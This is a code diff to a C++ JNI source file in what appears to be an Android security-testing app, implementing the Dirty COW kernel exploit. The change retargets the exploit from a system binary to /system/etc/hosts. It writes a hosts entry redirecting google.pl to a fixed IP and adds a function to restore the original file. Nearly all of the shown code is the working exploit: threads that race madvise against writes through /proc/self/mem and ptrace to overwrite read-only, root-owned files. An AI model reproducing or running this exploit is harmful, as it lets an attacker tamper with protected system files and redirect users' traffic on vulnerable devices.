@@ -1,5 +1,7 @@
 #include <jni.h>
 #include <string>
+#include <iostream>
+#include <sstream>
 #include <unistd.h>
 #include <string.h>
 #include <err.h>
@@ -24,13 +26,14 @@
 #define LOG_TAG "[Sarna DirtyCOW]: "
 
 /* Structure of arguments passed to threads */
-struct prog_arg  {
+struct prog_arg
+{
     void *offset;       /* memory address of mapped target file returned by mmap() call*/
     void *payload;      /* pointer to array containing content of payload file */
     off_t payload_size;
     const char *fname;  /* name of target file used by check threads for comparision of file and payload */
-    volatile int stop;  /* 1 if maximum try exceded or success */
-    volatile int success; /* set to 1 if payload is written to target file */
+    volatile bool stop;  /* 1 if maximum try exceded or success */
+    volatile bool success; /* set to 1 if payload is written to target file */
 };
 
 
@@ -67,27 +70,44 @@ using namespace std;
  */
 
 
+const char *target = "/system/etc/hosts";
+stringstream log;
+
 extern "C" JNIEXPORT jstring JNICALL Java_pl_edu_agh_sarna_dirtycow_task_DirtyCowTask_dcow(JNIEnv *env, jobject obj)
 {
-    // make file backup & mocking payload. for example payload can be shell script or SHARED LIBRARY
-    system("cp /system/bin/tc /data/data/pl.edu.agh.sarna/tc_copy");
-    system("echo 'File has changed [Dirty Copy-On-Write Vulnerability still alive]' > /data/data/pl.edu.agh.sarna/payload");
+
+    log.str("");
+    log << "Copying original target file [" << target << "];";
+
+    //make file backup & mocking payload. for example payload can be shell script or SHARED LIBRARY
+    system("cp /system/etc/hosts /data/data/pl.edu.agh.sarna/hosts_copy && chmod 440 /data/data/pl.edu.agh.sarna/hosts_copy");
+    system("echo -e '149.156.98.66\tgoogle.pl\n' > /data/data/pl.edu.agh.sarna/payload");
 
     //payload file, its content will be written
     const char* payload = "/data/data/pl.edu.agh.sarna/payload";
-    //file that will be replaced
-    const char *target = "/system/bin/tc";
-    const char *target_copy = "/data/data/pl.edu.agh.sarna/tc_copy";
 
-    if (dirtycow_main(payload, target)) {
+    if (dirtycow_main(payload, target))
+    {
+        log << "Success. Please visit https://google.pl";
         __android_log_print(LOG_LEVEL, LOG_TAG, "SUCCESS");
-        // bring back original file leaving changed would have impact on system stability
-        // especially when we replace system shared library or even a system tool binary from /system/bin
-        dirtycow_main(target_copy, target);
-        return env->NewStringUTF("success");
-    }
 
-    return env->NewStringUTF("fail");
+        return env->NewStringUTF(log.str().c_str());
+    }
+    log << "Fail. This device is not vulnerable";
+    __android_log_print(LOG_LEVEL, LOG_TAG, "FAIL");
+    return env->NewStringUTF(log.str().c_str());
+}
+
+extern "C" JNIEXPORT void JNICALL Java_pl_edu_agh_sarna_dirtycow_DirtyCowActivity_dcowUndo(JNIEnv *env, jobject obj) {
+    const char *target_copy = "/data/data/pl.edu.agh.sarna/hosts_copy";
+
+    if (dirtycow_main(target_copy, target)) {
+        __android_log_print(LOG_LEVEL, LOG_TAG, "Old file content restored.");
+    }
+    else
+    {
+        __android_log_print(LOG_LEVEL, LOG_TAG, "Failed to revert changes.");
+    }
 }
 
 
@@ -95,7 +115,7 @@ int dirtycow_main(const char* source_file, const char* target_file)
 {
     int status = 0;
     int target_file_fd, source_file_fd;
-    struct prog_arg args{NULL, NULL, 0, NULL, 0, 0};
+    struct prog_arg args{NULL, NULL, 0, NULL, false, false};
     struct stat target_file_stat, source_file_stat;
     void * map;
 
@@ -104,26 +124,33 @@ int dirtycow_main(const char* source_file, const char* target_file)
     target_file_fd = open(target_file, O_RDONLY);
     if (target_file_fd != -1)
     {
-        __android_log_print(LOG_LEVEL, LOG_TAG, "could not open %s", target_file);
-        status = 1;
         if (fstat(target_file_fd, &target_file_stat) == -1)
         {
             __android_log_print(LOG_LEVEL, LOG_TAG, "could not get stat structure of %s", target_file);
+            log << "Target file open: [X];";
             status = 2;
         }
     }
-
+    else
+    {
+        __android_log_print(LOG_LEVEL, LOG_TAG, "could not open %s", target_file);
+        log << "Target file open: Error;";
+        status = 1;
+    }
 
     source_file_fd = open(source_file, O_RDONLY);
     if (source_file_fd != -1)
     {
-        __android_log_print(LOG_LEVEL, LOG_TAG, "could not open %s", source_file);
-        status = 3;
         if (fstat(source_file_fd, &source_file_stat) == -1)
         {
             __android_log_print(LOG_LEVEL, LOG_TAG, "could not get stat structure of %s", source_file);
             status = 4;
         }
+    }
+    else
+    {
+        __android_log_print(LOG_LEVEL, LOG_TAG, "could not open %s", source_file);
+        status = 3;
     }
 
     __android_log_print(LOG_LEVEL, LOG_TAG, "Source size: %u, target size: %u",
@@ -154,22 +181,37 @@ int dirtycow_main(const char* source_file, const char* target_file)
     read(source_file_fd, args.payload, size);
     close(source_file_fd);
 
+    log << "Mapping file to mem: [X];";
     map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, target_file_fd, 0);
     if (map == MAP_FAILED)
     {
         __android_log_print(LOG_LEVEL, LOG_TAG, "mmap call failed with error code %i", errno);
+        log << "mmap call failed with error code" << errno << ';';
         status = 6;
+    }
+
+
+    if(status)
+    {
+        __android_log_print(LOG_LEVEL, LOG_TAG, "Error fallback;");
+        log << "Error fallback;";
+        return args.success;
     }
     else
     {
         args.offset = map;
         __android_log_print(LOG_LEVEL, LOG_TAG, "Mapping successful processing to exploitation");
+        log << "Mapping successful processing to exploitation;";
         exploit(&args);
     }
-    if (args.payload) {
+
+    if (args.payload)
+    {
         free(args.payload);
     }
-    if (target_file_fd > 0) {
+
+    if (target_file_fd > 0)
+    {
         close(target_file_fd);
     }
 
@@ -181,8 +223,8 @@ void exploit(struct prog_arg *mem_arg)
     //Threads executing madvice, mem write, chceking for target changes
     pthread_t pth1, pth2, pth3;
 
-    mem_arg->stop = 0;
-    mem_arg->success = 0;
+    mem_arg->stop = false;
+    mem_arg->success = false;
 
     __android_log_print(LOG_LEVEL, LOG_TAG, "Checking methods");
     if (is_self_mem_writable(mem_arg))
@@ -252,14 +294,14 @@ void *checkThread(void *arg) {
 
         memcmpret = memcmp(newdata, mem_arg->payload, mem_arg->payload_size);
         if (memcmpret == 0) {
-            mem_arg->stop = mem_arg->success = 1;
+            mem_arg->stop = mem_arg->success = true;
             break;
         }
         usleep(100 * 100);
     }
 
     if (newdata) free(newdata);
-    mem_arg->stop = 1;
+    mem_arg->stop = true;
     return (void*)memcmpret;
 }
 
@@ -272,11 +314,10 @@ void *madviseThread(void *arg)
     for(int i = 0; i < LOOP && !mem_arg->stop; i++)
         madvise(addr, size, MADV_DONTNEED);
 
-    mem_arg->stop = 1;
+    mem_arg->stop = true;
     return 0;
 }
 
-//
 int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n)
 {
     const unsigned char *s  = (const unsigned char*)src;
@@ -318,12 +359,12 @@ void *ptraceThread(void *arg)
         ptrace_memcpy(pid, mem_arg->offset, mem_arg->payload, mem_arg->payload_size);
     }
 
-    mem_arg->stop = 1;
+    mem_arg->stop = true;
     return NULL;
 }
 
 
-void*procselfmemThread(void *arg)
+void* procselfmemThread(void *arg)
 {
     struct prog_arg *mem_arg = (struct prog_arg *)arg;
     int fd = open("/proc/self/mem", O_RDWR);
@@ -334,6 +375,6 @@ void*procselfmemThread(void *arg)
     }
     close(fd);
 
-    mem_arg->stop = 1;
+    mem_arg->stop = true;
     return NULL;
 }
